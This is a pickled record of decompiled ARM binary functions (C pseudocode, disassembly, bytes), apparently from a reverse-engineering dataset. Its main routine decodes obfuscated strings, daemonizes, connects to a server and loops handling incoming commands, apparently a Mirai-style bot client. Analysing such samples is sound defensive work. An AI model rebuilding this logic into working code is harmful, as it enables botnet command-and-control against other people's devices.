(dp0
S'select'
p1
(S'\n__stdcall select(int __nfds, fd_set * __readfds, fd_set * __writefds, fd_set * __exceptfds, timeval * __timeout)\n'
p2
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint select(int __nfds,fd_set *__readfds,fd_set *__writefds,fd_set *__exceptfds,timeval *__timeout)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x0000897c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132f8)();\u000a  return iVar1;\u000a}\u000a\u000a
p3
S'adr r12,0x897c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x97c]!\n'
p4
S'00 c6 8f e2\n0a ca 8c e2\n7c f9 bc e5\n'
p5
S'.plt:00008974\n.plt:00008978\n.plt:0000897c\n'
p6
tp7
sS'sendto'
p8
(S'\n__stdcall sendto(int __fd, void * __buf, size_t __n, int __flags, sockaddr * __addr, socklen_t __addr_len)\n'
p9
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t sendto(int __fd,void *__buf,size_t __n,int __flags,sockaddr *__addr,socklen_t __addr_len)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a00. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_00013324)();\u000a  return sVar1;\u000a}\u000a\u000a
p10
S'adr r12,0x8a00\nadd r12,r12,#0xa000\nldr pc,[r12,#0x924]!\n'
p11
S'00 c6 8f e2\n0a ca 8c e2\n24 f9 bc e5\n'
p12
S'.plt:000089f8\n.plt:000089fc\n.plt:00008a00\n'
p13
tp14
sS'strcpy'
p15
(S'\n__stdcall strcpy(char * __dest, char * __src)\n'
p16
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000achar * strcpy(char *__dest,char *__src)\u000a\u000a{\u000a  char *pcVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008910. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pcVar1 = (char *)(*(code *)PTR_LAB_000132d4)();\u000a  return pcVar1;\u000a}\u000a\u000a
p17
S'adr r12,0x8910\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9c4]!\n'
p18
S'00 c6 8f e2\n0a ca 8c e2\nc4 f9 bc e5\n'
p19
S'.plt:00008908\n.plt:0000890c\n.plt:00008910\n'
p20
tp21
sS'srand'
p22
(S'\n__stdcall srand(uint __seed)\n'
p23
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid srand(uint __seed)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008a54. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00013340)();\u000a  return;\u000a}\u000a\u000a
p24
S'adr r12,0x8a54\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8ec]!\n'
p25
S'00 c6 8f e2\n0a ca 8c e2\nec f8 bc e5\n'
p26
S'.plt:00008a4c\n.plt:00008a50\n.plt:00008a54\n'
p27
tp28
sS'strlen'
p29
(S'\n__stdcall strlen(char * __s)\n'
p30
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000asize_t strlen(char *__s)\u000a\u000a{\u000a  size_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008aa8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_0001335c)();\u000a  return sVar1;\u000a}\u000a\u000a
p31
S'adr r12,0x8aa8\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8b4]!\n'
p32
S'00 c6 8f e2\n0a ca 8c e2\nb4 f8 bc e5\n'
p33
S'.plt:00008aa0\n.plt:00008aa4\n.plt:00008aa8\n'
p34
tp35
sS'FUN_0000b124'
p36
(S'\n__stdcall FUN_0000b124()\n'
p37
V\u000a/* WARNING: Control flow encountered bad instruction data */\u000a\u000avoid FUN_0000b124(void)\u000a\u000a{\u000a  if (*(code **)(PTR_DAT_0000b154 + -4) == (code *)0xffffffff) {\u000a    return;\u000a  }\u000a  (**(code **)(PTR_DAT_0000b154 + -4))();\u000a                    /* WARNING: Bad instruction - Truncating control flow here */\u000a  halt_baddata();\u000a}\u000a\u000a
p38
S'ldr r3,[0xb154]\nldr r2,[r3,#-0x4]\ncmn r2,#0x1\nstmdb sp!,{ r4 lr }\nsub r4,r3,#0x4\nldmeqia sp!,{ r4 pc }\nmov lr,pc\ncpy pc,r2\nmov r0,#0x4\nb 0x0000abb2\n'
p39
S'28 30 9f e5\n04 20 13 e5\n01 00 72 e3\n10 40 2d e9\n04 40 43 e2\n10 80 bd 08\n0f e0 a0 e1\n02 f0 a0 e1\n04 20\n34 e5\n'
p40
S'.text:0000b124\n.text:0000b128\n.text:0000b12c\n.text:0000b130\n.text:0000b134\n.text:0000b138\n.text:0000b13c\n.text:0000b140\n.text:0000b144\n.text:0000b146\n'
p41
tp42
sS'__errno_location'
p43
(S'\n__stdcall __errno_location()\n'
p44
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint * __errno_location(void)\u000a\u000a{\u000a  int *piVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a84. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  piVar1 = (int *)(*(code *)PTR_LAB_00013350)();\u000a  return piVar1;\u000a}\u000a\u000a
p45
S'adr r12,0x8a84\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8cc]!\n'
p46
S'00 c6 8f e2\n0a ca 8c e2\ncc f8 bc e5\n'
p47
S'.plt:00008a7c\n.plt:00008a80\n.plt:00008a84\n'
p48
tp49
sS'signal'
p50
(S'\n__stdcall signal(int __sig, __sighandler_t __handler)\n'
p51
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__sighandler_t signal(int __sig,__sighandler_t __handler)\u000a\u000a{\u000a  __sighandler_t pVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089f4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pVar1 = (__sighandler_t)(*(code *)PTR_LAB_00013320)();\u000a  return pVar1;\u000a}\u000a\u000a
p52
S'adr r12,0x89f4\nadd r12,r12,#0xa000\nldr pc,[r12,#0x92c]!\n'
p53
S'00 c6 8f e2\n0a ca 8c e2\n2c f9 bc e5\n'
p54
S'.plt:000089ec\n.plt:000089f0\n.plt:000089f4\n'
p55
tp56
sS'write'
p57
(S'\n__stdcall write(int __fd, void * __buf, size_t __n)\n'
p58
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t write(int __fd,void *__buf,size_t __n)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089ac. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_00013308)();\u000a  return sVar1;\u000a}\u000a\u000a
p59
S'adr r12,0x89ac\nadd r12,r12,#0xa000\nldr pc,[r12,#0x95c]!\n'
p60
S'00 c6 8f e2\n0a ca 8c e2\n5c f9 bc e5\n'
p61
S'.plt:000089a4\n.plt:000089a8\n.plt:000089ac\n'
p62
tp63
sS'FUN_0000a8c0'
p64
(S'\n__stdcall FUN_0000a8c0()\n'
p65
V\u000aundefined4 FUN_0000a8c0(int iParm1,undefined4 *puParm2)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *__src;\u000a  int iVar2;\u000a  void *pvVar3;\u000a  uint __fd;\u000a  uint uVar4;\u000a  size_t __n;\u000a  __pid_t _Var5;\u000a  uint *puVar6;\u000a  int iVar7;\u000a  uint uVar8;\u000a  char cVar9;\u000a  int iVar10;\u000a  char *__dest;\u000a  int iVar11;\u000a  undefined *puVar12;\u000a  undefined *puVar13;\u000a  undefined *puVar14;\u000a  uint uVar15;\u000a  bool bVar16;\u000a  char acStack1968 [1024];\u000a  char acStack944 [256];\u000a  undefined *local_2b0;\u000a  char acStack548 [128];\u000a  uint uStack420;\u000a  undefined auStack292 [128];\u000a  uint auStack164 [32];\u000a  \u000a  local_2b0 = PTR_DAT_0000afc8;\u000a  iVar2 = sigaction(2,(sigaction *)&local_2b0,(sigaction *)0x0);\u000a  if ((iVar2 != 0) || (iVar2 = sigaction(0xd,(sigaction *)&local_2b0,(sigaction *)0x0), iVar2 != 0))\u000a  {\u000a                    /* WARNING: Subroutine does not return */\u000a    exit(1);\u000a  }\u000a  FUN_000096d0();\u000a  puVar1 = PTR_DAT_0000afec;\u000a  if (iParm1 < 2) {\u000a    memset(PTR_DAT_0000afec + 4,0,0x200);\u000a    __src = PTR_DAT_0000afdc;\u000a    if (*(short *)(puVar1 + 0x204) == 0) {\u000a      iVar2 = 0;\u000a    }\u000a    else {\u000a      iVar10 = *(int *)puVar1;\u000a      iVar2 = 0;\u000a      puVar14 = puVar1;\u000a      do {\u000a        iVar11 = 0;\u000a        do {\u000a          cVar9 = __src[iVar11];\u000a          bVar16 = *(char *)(iVar10 + iVar2) == cVar9;\u000a          if (bVar16) {\u000a            cVar9 = PTR_DAT_0000afe0[iVar11];\u000a          }\u000a          iVar11 = iVar11 + 1;\u000a          if (bVar16) {\u000a            puVar14[4] = cVar9;\u000a          }\u000a        } while (iVar11 != 0x41);\u000a        iVar2 = iVar2 + 1;\u000a        puVar14 = puVar14 + 1;\u000a      } while (iVar2 < (int)(uint)*(ushort *)(puVar1 + 0x204));\u000a    }\u000a    __src = PTR_DAT_0000aff0;\u000a    puVar1[iVar2 + 4] = 0;\u000a    strcpy(acStack944,__src);\u000a  }\u000a  else {\u000a    strcpy(acStack944,(char *)puParm2[1]);\u000a  }\u000a  pvVar3 = calloc(10,0x280);\u000a  puVar1 = PTR_DAT_0000afcc;\u000a  iVar10 = 0;\u000a  *(void **)(PTR_DAT_0000afcc + 0x18) = pvVar3;\u000a  *(undefined4 *)(puVar1 + 0x14) = 10;\u000a  *(undefined4 *)(puVar1 + 0x2a0) = 0xffffffff;\u000a  *(undefined4 *)(puVar1 + 0x1c) = 0;\u000a  *(undefined4 *)(puVar1 + 0x524) = 0;\u000a  iVar2 = FUN_000099f0(puVar1);\u000a  if (iVar2 == 0) {\u000a    __fd = fcntl(0,3,0);\u000a    fcntl(0,4,__fd | 0x800);\u000a    iVar2 = *(int *)puVar1;\u000a    __fd = time((time_t *)0x0);\u000a    uVar4 = getpid();\u000a    srand(__fd ^ uVar4);\u000a    __fd = time((time_t *)0x0);\u000a    uVar4 = getpid();\u000a    puVar6 = (uint *)PTR_DAT_0000afd0;\u000a    __fd = __fd ^ uVar4;\u000a    *(uint *)(PTR_DAT_0000afd0 + 4) = __fd + 0x9e3779b9;\u000a    *(uint *)((undefined *)puVar6 + 8) = __fd + 0x3c6ef372;\u000a    *puVar6 = __fd;\u000a    __fd = DAT_0000afd4;\u000a    uVar4 = 3;\u000a    do {\u000a      uVar8 = uVar4 ^ *puVar6;\u000a      uVar4 = uVar4 + 1;\u000a      puVar6[3] = uVar8 ^ puVar6[1] ^ __fd;\u000a      __src = PTR_DAT_0000afd8;\u000a      puVar6 = puVar6 + 1;\u000a    } while (uVar4 != 0x1000);\u000a    memset(PTR_DAT_0000afd8 + 4,0,0x200);\u000a    puVar14 = PTR_DAT_0000afdc;\u000a    if (*(short *)(__src + 0x204) == 0) {\u000a      iVar10 = 0;\u000a    }\u000a    else {\u000a      iVar11 = *(int *)__src;\u000a      iVar10 = 0;\u000a      puVar13 = __src;\u000a      do {\u000a        iVar7 = 0;\u000a        do {\u000a          cVar9 = puVar14[iVar7];\u000a          bVar16 = *(char *)(iVar11 + iVar10) == cVar9;\u000a          if (bVar16) {\u000a            cVar9 = PTR_DAT_0000afe0[iVar7];\u000a          }\u000a          iVar7 = iVar7 + 1;\u000a          if (bVar16) {\u000a            puVar13[4] = cVar9;\u000a          }\u000a        } while (iVar7 != 0x41);\u000a        iVar10 = iVar10 + 1;\u000a        puVar13 = puVar13 + 1;\u000a      } while (iVar10 < (int)(uint)*(ushort *)(__src + 0x204));\u000a    }\u000a    __src[iVar10 + 4] = 0;\u000a    memset(PTR_DAT_0000afe4,0,0x200);\u000a    puVar14 = PTR_DAT_0000afdc;\u000a    if (*(short *)(__src + 0x204) == 0) {\u000a      iVar10 = 0;\u000a    }\u000a    else {\u000a      iVar11 = *(int *)__src;\u000a      iVar10 = 0;\u000a      puVar13 = PTR_DAT_0000afd8;\u000a      do {\u000a        iVar7 = 0;\u000a        do {\u000a          cVar9 = puVar14[iVar7];\u000a          bVar16 = *(char *)(iVar11 + iVar10) == cVar9;\u000a          if (bVar16) {\u000a            cVar9 = PTR_DAT_0000afe0[iVar7];\u000a          }\u000a          iVar7 = iVar7 + 1;\u000a          if (bVar16) {\u000a            puVar13[4] = cVar9;\u000a          }\u000a        } while (iVar7 != 0x41);\u000a        iVar10 = iVar10 + 1;\u000a        puVar13 = puVar13 + 1;\u000a      } while (iVar10 < (int)(uint)*(ushort *)(__src + 0x204));\u000a    }\u000a    __src[iVar10 + 4] = 0;\u000a    __n = strlen(PTR_DAT_0000afe4);\u000a    write(1,PTR_DAT_0000afe4,__n);\u000a    write(1,PTR_DAT_0000afe8,1);\u000a    signal(0xd,(__sighandler_t)0x1);\u000a    _Var5 = fork();\u000a    __src = PTR_DAT_0000aff4;\u000a    if (0 < _Var5) {\u000a      return 0;\u000a    }\u000a    *(undefined *)*puParm2 = 0;\u000a    chdir(__src);\u000a    iVar10 = 0;\u000a    do {\u000a      *(undefined4 *)((int)((fd_set *)auStack164)->fds_bits + iVar10) = 0;\u000a      iVar10 = iVar10 + 4;\u000a    } while (iVar10 != 0x80);\u000a    uVar4 = 1 << (*(uint *)puVar1 & 0x1f);\u000a    __fd = *(uint *)puVar1 >> 5;\u000a    auStack164[0] = auStack164[0] | 1;\u000a    uVar8 = auStack164[__fd];\u000a    iVar10 = 0;\u000a    do {\u000a      *(undefined4 *)((int)((fd_set *)(&local_2b0 + 0x18c))->fds_bits + iVar10) = 0;\u000a      iVar10 = iVar10 + 4;\u000a    } while (iVar10 != 0x80);\u000a    if (0 < *(int *)(puVar1 + 0x1c)) {\u000a      *(uint *)(&local_2b0 + __fd * 4 + 0x18c) = uVar4 | *(uint *)(&local_2b0 + __fd * 4 + 0x18c);\u000a    }\u000a    iVar10 = 0;\u000a    do {\u000a      *(undefined4 *)((int)((fd_set *)(&local_2b0 + 0x10c))->fds_bits + iVar10) = 0;\u000a      iVar10 = iVar10 + 4;\u000a    } while (iVar10 != 0x80);\u000a    uStack420 = uStack420 | 1;\u000a    uVar15 = *(uint *)(&local_2b0 + __fd * 4 + 0x10c);\u000a    auStack164[__fd] = uVar4 | uVar8;\u000a    *(uint *)(&local_2b0 + __fd * 4 + 0x10c) = uVar4 | uVar15;\u000a    iVar10 = select(iVar2 + 1,(fd_set *)auStack164,(fd_set *)(&local_2b0 + 0x18c),\u000a                    (fd_set *)(&local_2b0 + 0x10c),(timeval *)0x0);\u000a    __src = PTR_DAT_0000afcc;\u000a    if (iVar10 == -1) {\u000a      close(*(int *)puVar1);\u000a      free(*(void **)(puVar1 + 0x18));\u000a      *(undefined4 *)(puVar1 + 0x18) = 0;\u000a                    /* WARNING: Subroutine does not return */\u000a      exit(1);\u000a    }\u000a    if (iVar10 != 0) {\u000a      if ((uStack420 & 1) != 0) {\u000a        close(*(int *)puVar1);\u000a        free(*(void **)(puVar1 + 0x18));\u000a        *(undefined4 *)(puVar1 + 0x18) = 0;\u000a                    /* WARNING: Subroutine does not return */\u000a        exit(1);\u000a      }\u000a      if (((*(int *)(&local_2b0 + (*(uint *)puVar1 >> 5) * 4 + 0x18c) >> (*(uint *)puVar1 & 0x1f) &\u000a           1U) != 0) && (iVar2 = FUN_00009100(PTR_DAT_0000afcc), iVar2 != 0)) {\u000a        close(*(int *)__src);\u000a        free(*(void **)(__src + 0x18));\u000a        *(undefined4 *)(__src + 0x18) = 0;\u000a                    /* WARNING: Subroutine does not return */\u000a        exit(1);\u000a      }\u000a      puVar14 = PTR_DAT_0000aff8;\u000a      __src = PTR_DAT_0000afcc;\u000a      __fd = *(uint *)puVar1;\u000a      uVar4 = *(int *)(&local_2b0 + (__fd >> 5) * 4 + 0x10c) >> (__fd & 0x1f) & 1;\u000a      if (uVar4 == 0) {\u000a        memset(PTR_DAT_0000aff8 + 4,0,0x200);\u000a        puVar13 = PTR_DAT_0000afe0;\u000a        __src = PTR_DAT_0000afdc;\u000a        if (*(short *)(puVar14 + 0x204) != 0) {\u000a          iVar2 = *(int *)puVar14;\u000a          puVar12 = puVar14;\u000a          do {\u000a            iVar10 = 0;\u000a            do {\u000a              cVar9 = __src[iVar10];\u000a              bVar16 = *(char *)(iVar2 + uVar4) == cVar9;\u000a              if (bVar16) {\u000a                cVar9 = puVar13[iVar10];\u000a              }\u000a              iVar10 = iVar10 + 1;\u000a              if (bVar16) {\u000a                puVar12[4] = cVar9;\u000a              }\u000a            } while (iVar10 != 0x41);\u000a            uVar4 = uVar4 + 1;\u000a            puVar12 = puVar12 + 1;\u000a          } while ((int)uVar4 < (int)(uint)*(ushort *)(puVar14 + 0x204));\u000a        }\u000a        __dest = &local_2b0 + 0x8c;\u000a        puVar14[uVar4 + 4] = 0;\u000a        strcpy(__dest,PTR_DAT_0000affc);\u000a        __n = strlen(__dest);\u000a        memcpy(__dest + __n,PTR_DAT_0000b000,2);\u000a        strcat(__dest,acStack944);\u000a        __n = strlen(__dest);\u000a        memcpy(__dest + __n,PTR_DAT_0000afe8,2);\u000a        __src = PTR_DAT_0000afcc;\u000a        do {\u000a          do {\u000a            __n = strlen(__dest);\u000a            write(*(int *)puVar1,__dest,__n);\u000a            while (iVar2 = FUN_00008bec(*(undefined4 *)puVar1,acStack1968,0x400), iVar2 != -1) {\u000a              acStack1968[iVar2] = 0;\u000a              __n = strlen(acStack1968);\u000a              FUN_0000a788(acStack1968,__n);\u000a            }\u000a            sleep(5);\u000a            close(*(int *)__src);\u000a            free(*(void **)(__src + 0x18));\u000a            *(undefined4 *)(__src + 0x18) = 0;\u000a            pvVar3 = calloc(10,0x280);\u000a            *(void **)(__src + 0x18) = pvVar3;\u000a            *(undefined4 *)(__src + 0x14) = 10;\u000a            *(undefined4 *)(__src + 0x2a0) = 0xffffffff;\u000a            *(undefined4 *)(__src + 0x1c) = 0;\u000a            *(undefined4 *)(__src + 0x524) = 0;\u000a            iVar2 = FUN_000099f0(PTR_DAT_0000afcc);\u000a          } while (iVar2 == 0);\u000a          do {\u000a            sleep(3);\u000a            iVar2 = FUN_000099f0(PTR_DAT_0000afcc);\u000a          } while (iVar2 != 0);\u000a        } while( true );\u000a      }\u000a      close(__fd);\u000a      free(*(void **)(__src + 0x18));\u000a      *(undefined4 *)(__src + 0x18) = 0;\u000a                    /* WARNING: Subroutine does not return */\u000a      exit(1);\u000a    }\u000a  }\u000a  close(*(int *)puVar1);\u000a  free(*(void **)(puVar1 + 0x18));\u000a  *(int *)(puVar1 + 0x18) = iVar10;\u000a                    /* WARNING: Subroutine does not return */\u000a  exit(1);\u000a}\u000a\u000a
p66
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nsub sp,sp,#0x790\nadd r5,sp,#0x500\nldr r3,[0xafc8]\nadd r5,r5,#0x4\ncpy r4,r0\ncpy r10,r1\nmov r0,#0x2\ncpy r1,r5\nmov r2,#0x0\nstr r3,[sp,#0x504]\nbl 0x00008a28\ncmp r0,#0x0\nbne 0x0000a910\ncpy r2,r0\ncpy r1,r5\nmov r0,#0xd\nbl 0x00008a28\ncmp r0,#0x0\nbeq 0x0000a918\nmov r0,#0x1\nbl 0x00008a88\nbl 0x000096d0\ncmp r4,#0x1\nble 0x0000ab78\nadd r11,sp,#0x400\nadd r11,r11,#0x4\ncpy r0,r11\nldr r1,[r10,#0x4]\nbl 0x00008908\n'
p67
S'f0 4f 2d e9\n79 de 4d e2\n05 5c 8d e2\nf4 36 9f e5\n04 50 85 e2\n00 40 a0 e1\n01 a0 a0 e1\n02 00 a0 e3\n05 10 a0 e1\n00 20 a0 e3\n04 35 8d e5\n4d f8 ff eb\n00 00 50 e3\n05 00 00 1a\n00 20 a0 e1\n05 10 a0 e1\n0d 00 a0 e3\n47 f8 ff eb\n00 00 50 e3\n01 00 00 0a\n01 00 a0 e3\n5b f8 ff eb\n6c fb ff eb\n01 00 54 e3\n94 00 00 da\n01 bb 8d e2\n04 b0 8b e2\n0b 00 a0 e1\n04 10 9a e5\nf3 f7 ff eb\n'
p68
S'.text:0000a8c0\n.text:0000a8c4\n.text:0000a8c8\n.text:0000a8cc\n.text:0000a8d0\n.text:0000a8d4\n.text:0000a8d8\n.text:0000a8dc\n.text:0000a8e0\n.text:0000a8e4\n.text:0000a8e8\n.text:0000a8ec\n.text:0000a8f0\n.text:0000a8f4\n.text:0000a8f8\n.text:0000a8fc\n.text:0000a900\n.text:0000a904\n.text:0000a908\n.text:0000a90c\n.text:0000a910\n.text:0000a914\n.text:0000a918\n.text:0000a91c\n.text:0000a920\n.text:0000a924\n.text:0000a928\n.text:0000a92c\n.text:0000a930\n.text:0000a934\n'
p69
tp70
sS'_DT_FINI'
p71
(S'\n__stdcall _DT_FINI()\n'
p72
V\u000avoid _DT_FINI(void)\u000a\u000a{\u000a  FUN_00008ad0();\u000a  return;\u000a}\u000a\u000a
p73
S'cpy r12,sp\nstmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 r12 lr pc}\nsub r11,r12,#0x4\nbl 0x00008ad0\nldmdb r11,{ r4 r5 r6 r7 r8 r9 r10 r11 sp pc}\n'
p74
S'0d c0 a0 e1\nf0 df 2d e9\n04 b0 4c e2\n57 f6 ff eb\nf0 af 1b e9\n'
p75
S'.fini:0000b160\n.fini:0000b164\n.fini:0000b168\n.fini:0000b16c\n.fini:0000b170\n'
p76
tp77
sS'strtok'
p78
(S'\n__stdcall strtok(char * __s, char * __delim)\n'
p79
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000achar * strtok(char *__s,char *__delim)\u000a\u000a{\u000a  char *pcVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a18. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pcVar1 = (char *)(*(code *)PTR_LAB_0001332c)();\u000a  return pcVar1;\u000a}\u000a\u000a
p80
S'adr r12,0x8a18\nadd r12,r12,#0xa000\nldr pc,[r12,#0x914]!\n'
p81
S'00 c6 8f e2\n0a ca 8c e2\n14 f9 bc e5\n'
p82
S'.plt:00008a10\n.plt:00008a14\n.plt:00008a18\n'
p83
tp84
sS'chdir'
p85
(S'\n__stdcall chdir(char * __path)\n'
p86
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint chdir(char *__path)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089d0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013314)();\u000a  return iVar1;\u000a}\u000a\u000a
p87
S'adr r12,0x89d0\nadd r12,r12,#0xa000\nldr pc,[r12,#0x944]!\n'
p88
S'00 c6 8f e2\n0a ca 8c e2\n44 f9 bc e5\n'
p89
S'.plt:000089c8\n.plt:000089cc\n.plt:000089d0\n'
p90
tp91
sS'FUN_00009100'
p92
(S'\n__stdcall FUN_00009100()\n'
p93
V\u000aundefined4 FUN_00009100(int *piParm1)\u000a\u000a{\u000a  int iVar1;\u000a  int *piVar2;\u000a  uint uVar3;\u000a  size_t __n;\u000a  \u000a  uVar3 = piParm1[0xa8];\u000a  while( true ) {\u000a    __n = 0x280 - uVar3;\u000a    if (uVar3 < 0x280) {\u000a      if (100 < __n) {\u000a        __n = 100;\u000a      }\u000a      iVar1 = send(*piParm1,(void *)((int)piParm1 + uVar3 + 0x20),__n,0);\u000a    }\u000a    else {\u000a      if (piParm1[7] == 0) {\u000a        piParm1[0xa8] = -1;\u000a        return 0;\u000a      }\u000a      memcpy(piParm1 + 8,(void *)(piParm1[7] * 0x280 + piParm1[6] + -0x280),0x280);\u000a      piParm1[7] = piParm1[7] + -1;\u000a      piParm1[0xa8] = 0;\u000a      iVar1 = send(*piParm1,piParm1 + 8,100,0);\u000a    }\u000a    if (iVar1 < 0) {\u000a      piVar2 = __errno_location();\u000a      if (*piVar2 == 0xb) {\u000a        return 0;\u000a      }\u000a      return 0xffffffff;\u000a    }\u000a    if (iVar1 == 0) {\u000a      return 0;\u000a    }\u000a    if (iVar1 < 1) break;\u000a    uVar3 = piParm1[0xa8] + iVar1;\u000a    piParm1[0xa8] = uVar3;\u000a  }\u000a  return 0;\u000a}\u000a\u000a
p94
S'stmdb sp!,{ r4 r5 r6 lr }\nldr r12,[r0,#0x2a0]\ncpy r4,r0\nadd r6,r0,#0x14\nb 0x0000918c\nldr r12,[r6,#0x8]\nmov r1,r12, lsl #0x9\nmov r3,r12, lsl #0x7\ncmp r12,#0x0\nadd r3,r3,r1\nbeq 0x000091f4\nldr r1,[r6,#0x4]\nadd r1,r3,r1\nsub r1,r1,#0x280\nbl 0x00008944\nldr r3,[r6,#0x8]\nsub r3,r3,#0x1\nstr r3,[r6,#0x8]\nmov r12,#0x0\ncpy r2,r12\nmov lr,#0x64\nadd r1,r5,r2\nstr r12,[r4,#0x2a0]\ncpy r2,lr\nldr r0,[r4,#0x0]\nmov r3,#0x0\nbl 0x00008980\ncmp r0,#0x0\nblt 0x000091d8\nbeq 0x000091ec\nble 0x000091ec\nldr r12,[r4,#0x2a0]\nadd r3,r12,r0\nstr r3,[r4,#0x2a0]\ncpy r12,r3\nmov r2,#0x280\nadd r5,r4,#0x20\ncmp r12,r2\ncpy r0,r5\nrsb lr,r12,r2\nbcs 0x00009114\ncmp lr,#0x64\ncpy r2,r12\nmovhi lr,#0x64\ncpyls r2,r12\nadd r5,r4,#0x20\naddls r5,r4,#0x20\nadd r1,r5,r2\nldr r0,[r4,#0x0]\ncpy r2,lr\nmov r3,#0x0\nbl 0x00008980\ncmp r0,#0x0\nbge 0x00009174\nbl 0x00008a7c\nldr r3,[r0,#0x0]\ncmp r3,#0xb\nmvnne r0,#0x0\nldmneia sp!,{ r4 r5 r6 pc }\nmov r0,#0x0\nldmia sp!,{ r4 r5 r6 pc }\ncpy r0,r12\nmvn r12,#0x0\nstr r12,[r4,#0x2a0]\nldmia sp!,{ r4 r5 r6 pc }\n'
p95
S'70 40 2d e9\na0 c2 90 e5\n00 40 a0 e1\n14 60 80 e2\n1d 00 00 ea\n08 c0 96 e5\n8c 14 a0 e1\n8c 33 a0 e1\n00 00 5c e3\n01 30 83 e0\n31 00 00 0a\n04 10 96 e5\n01 10 83 e0\n0a 1d 41 e2\n01 fe ff eb\n08 30 96 e5\n01 30 43 e2\n08 30 86 e5\n00 c0 a0 e3\n0c 20 a0 e1\n64 e0 a0 e3\n02 10 85 e0\na0 c2 84 e5\n0e 20 a0 e1\n00 00 94 e5\n00 30 a0 e3\n04 fe ff eb\n00 00 50 e3\n18 00 00 ba\n1c 00 00 0a\n1b 00 00 da\na0 c2 94 e5\n00 30 8c e0\na0 32 84 e5\n03 c0 a0 e1\n0a 2d a0 e3\n20 50 84 e2\n02 00 5c e1\n05 00 a0 e1\n02 e0 6c e0\ndb ff ff 2a\n64 00 5e e3\n0c 20 a0 e1\n64 e0 a0 83\n0c 20 a0 91\n20 50 84 e2\n20 50 84 92\n02 10 85 e0\n00 00 94 e5\n0e 20 a0 e1\n00 30 a0 e3\neb fd ff eb\n00 00 50 e3\ne6 ff ff aa\n27 fe ff eb\n00 30 90 e5\n0b 00 53 e3\n00 00 e0 13\n70 80 bd 18\n00 00 a0 e3\n70 80 bd e8\n0c 00 a0 e1\n00 c0 e0 e3\na0 c2 84 e5\n70 80 bd e8\n'
p96
S'.text:00009100\n.text:00009104\n.text:00009108\n.text:0000910c\n.text:00009110\n.text:00009114\n.text:00009118\n.text:0000911c\n.text:00009120\n.text:00009124\n.text:00009128\n.text:0000912c\n.text:00009130\n.text:00009134\n.text:00009138\n.text:0000913c\n.text:00009140\n.text:00009144\n.text:00009148\n.text:0000914c\n.text:00009150\n.text:00009154\n.text:00009158\n.text:0000915c\n.text:00009160\n.text:00009164\n.text:00009168\n.text:0000916c\n.text:00009170\n.text:00009174\n.text:00009178\n.text:0000917c\n.text:00009180\n.text:00009184\n.text:00009188\n.text:0000918c\n.text:00009190\n.text:00009194\n.text:00009198\n.text:0000919c\n.text:000091a0\n.text:000091a4\n.text:000091a8\n.text:000091ac\n.text:000091b0\n.text:000091b4\n.text:000091b8\n.text:000091bc\n.text:000091c0\n.text:000091c4\n.text:000091c8\n.text:000091cc\n.text:000091d0\n.text:000091d4\n.text:000091d8\n.text:000091dc\n.text:000091e0\n.text:000091e4\n.text:000091e8\n.text:000091ec\n.text:000091f0\n.text:000091f4\n.text:000091f8\n.text:000091fc\n.text:00009200\n'
p97
tp98
sS'sigaction'
p99
(S'\n__stdcall sigaction(int __sig, sigaction * __act, sigaction * __oact)\n'
p100
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint sigaction(int __sig,sigaction *__act,sigaction *__oact)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a30. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013334)();\u000a  return iVar1;\u000a}\u000a\u000a
p101
